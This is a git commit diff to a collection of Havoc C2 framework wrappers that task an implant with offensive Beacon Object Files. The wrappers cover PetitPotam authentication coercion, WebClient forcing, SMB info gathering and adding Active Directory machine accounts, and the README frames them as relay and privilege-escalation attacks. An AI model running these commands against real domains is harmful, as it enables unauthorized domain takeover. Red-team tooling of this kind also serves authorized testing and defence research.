f377c94b108241b9f55cb039d26d809ebfeec12c
Lav <l.m@securescape.cc>
2024-05-09 20:53:02 +0100

    Added 'AddMachineAccount'

--- BofCollection.py
+++ BofCollection.py
@@ -12,7 +12,6 @@ def petitpotam(demonID, *param):
     target          = ''
     capture_server  = ''
 
-
     if num_params != 2:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, 'Only accepts two parameters [Capture Server, Target]' )
         return False
@@ -20,9 +19,9 @@ def petitpotam(demonID, *param):
     packer.addWstr(target)
     packer.addWstr(capture_server)
 
-    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to coerce with PetitPotam - USING bin/PetitPotam.{demon.ProcessArch}.o")
+    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to coerce with PetitPotam")
 
-    demon.InlineExecute( TaskID, "go", f"bin/PetitPotam.{demon.ProcessArch}.o", packer.getbuffer(), False )
+    demon.InlineExecute( TaskID, "go", f"bin/petitpotam/PetitPotam.{demon.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
@@ -36,7 +35,6 @@ def smbinfo(demonID, *param):
     num_params      = len(param)
     hostname  = ''
 
-
     if num_params != 1:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, 'Usage: smbinfo [Hostname]' )
         return False
@@ -45,7 +43,7 @@ def smbinfo(demonID, *param):
 
     TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to get remote system version info")
 
-    demon.InlineExecute( TaskID, "go", f"bin/Smbinfo.{demon.ProcessArch}.o", packer.getbuffer(), False )
+    demon.InlineExecute( TaskID, "go", f"bin/smbinfo/Smbinfo.{demon.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
@@ -57,7 +55,65 @@ def startwebclient(demonID, *param):
 
     TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to force start the Web Client service")
 
-    demon.InlineExecute( TaskID, "go", f"bin/StartWebClient.{demon.ProcessArch}.o", b'', False )
+    demon.InlineExecute( TaskID, "go", f"bin/startwebclient/StartWebClient.{demon.ProcessArch}.o", b'', False )
+
+    return TaskID
+
+
+def addmachineaccount(demonID, *param):
+    TaskID : str    = None
+    demon  : Demon  = None
+
+    packer          = Packer()
+    demon           = Demon( demonID )
+    num_params      = len(param)
+    computername    = ''
+    password        = ''
+
+    if num_params != 2:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, 'Usage: addmachineaccount [Computer Name] [Password]' )
+        return False
+
+    packer.addWstr( computername )
+    packer.addWstr( password )
+
+    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to use Active Directory Service Interfaces (ADSI) to add a computer account to AD.")
+
+    demon.InlineExecute( TaskID, "go", f"bin/machineaccount/AddMachineAccount.{demon.ProcessArch}.o", packer.getbuffer(), False )
+
+    return TaskID
+
+
+def delmachineaccount(demonID, *param):
+    TaskID : str    = None
+    demon  : Demon  = None
+
+    packer          = Packer()
+    demon           = Demon( demonID )
+    num_params      = len(param)
+    computername    = ''
+
+    if num_params != 1:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, 'Usage: delmachineaccount [Computer Name]' )
+        return False
+
+    packer.addWstr( computername )
+
+    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to use Active Directory Service Interfaces (ADSI) to delete a computer account from AD.")
+
+    demon.InlineExecute( TaskID, "go", f"bin/machineaccount/DelMachineAccount.{demon.ProcessArch}.o", packer.getbuffer(), False )
+
+    return TaskID
+
+
+def getmachineaccountquota(demonID, *param):
+    TaskID : str    = None
+    demon  : Demon  = None
+    demon           = Demon( demonID )
+
+    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to use Active Directory Service Interfaces (ADSI) to read the ms-DS-MachineAccountQuota value from AD.")
+
+    demon.InlineExecute( TaskID, "go", f"bin/machineaccount/GetMachineAccountQuota.{demon.ProcessArch}.o", b'', False )
 
     return TaskID
 
@@ -66,8 +122,12 @@ RegisterCommand(petitpotam, "", "petitpotam", "Coerce Windows hosts to authentic
                     SMB Relay Attack                : petitpotam KALI DC2019
                     WebDAV LPE Attack               : petitpotam KALI@80/nop localhost
                     WebDAV LPE w/SOCKS and rportfwd : petitpotam localhost@80/nop localhost
-                """)
+""")
 
 RegisterCommand(smbinfo, "", "smbinfo", "Gather remote system version info using the NetWkstaGetInfo API.", 0, "[Hostname]", "CASTELBLACK")
+
 RegisterCommand(startwebclient, "", "startwebclient", "Force start the Web Client service.", 0, "", "")
 
+RegisterCommand(addmachineaccount, "", "addmachineaccount", "Add a computer account to the Active Directory domain.", 0, "[Computer Name] [Password]", "PIVOT n3rdl0l")
+RegisterCommand(delmachineaccount, "", "delmachineaccount", "", 0, "", "")
+RegisterCommand(getmachineaccountquota, "", "getmachineaccountquota", "", 0, "", "")
--- README.md
+++ README.md
@@ -4,11 +4,20 @@ BOFs gift wrapped for Havoc
 ## [C2 Tools Collection](https://github.com/outflanknl/C2-Tool-Collection)
 
 - [PetitPotam](https://github.com/outflanknl/C2-Tool-Collection/tree/main/BOF/PetitPotam)
+> Perform an attack which abuses MS-EFSRPC - Escalate privileges from Domain User to Domain Admin
 
 >[!warning]
 >Currently crashes and kills your beacon
 
 - [Smbinfo](https://github.com/outflanknl/C2-Tool-Collection/tree/main/BOF/Smbinfo)
+> Gather remote system version information
+
+![[Smbinfo.png]]
 
 - [StartWebClient](https://github.com/outflanknl/C2-Tool-Collection/tree/main/BOF/StartWebClient)
+> Force the Web client service to be started - useful to perform further attacks (such as PetitPotam)
+
+![[StartWebClient.png]]
+
+
 
